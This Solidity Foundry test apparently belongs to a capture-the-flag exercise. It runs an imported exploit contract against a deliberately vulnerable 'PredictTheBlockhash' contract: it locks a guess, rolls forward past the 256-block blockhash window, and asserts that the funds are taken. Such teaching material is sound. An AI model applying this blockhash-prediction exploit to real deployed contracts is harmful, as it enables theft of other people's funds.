// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {PredictTheBlockhash, ExploitContract} from "../src/PredictTheBlockhash.sol";

/**
 * @title PredictTheBlockhash Attack Test
 * @notice Demonstrates exploitation of blockhash prediction
 *
 * @dev The vulnerability exists because:
 * - Contract allows locking in a guess of the blockhash of the next block
 * - If the guess is made at the right time, it can be accurately predicted
 *
 * Attack flow:
 * 1. ExploitContract locks in the guess of the current blockhash
 * 2. After the block number increases, calls settle
 * 3. If the prediction is correct, funds are transferred
 */
contract PredictTheBlockhashTest is Test {
    PredictTheBlockhash public predictTheBlockhash;
    ExploitContract public exploitContract;

    function setUp() public {
        // Deploy contracts
        predictTheBlockhash = (new PredictTheBlockhash){value: 1 ether}();
        exploitContract = new ExploitContract(predictTheBlockhash);

        vm.deal(address(exploitContract), 10 ether);
    }

    function testExploit() public {
        // Set block number
        uint256 blockNumber = block.number;
        // To roll forward, add the number of blocks to blockNumber,
        // Eg. roll forward 10 blocks: blockNumber + 10
        vm.roll(blockNumber + 10);

        exploitContract.lockGuess();

        vm.roll(blockNumber + 268);

        exploitContract.exploit();

        _checkSolved();
    }

    function _checkSolved() internal view {
        assertTrue(predictTheBlockhash.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
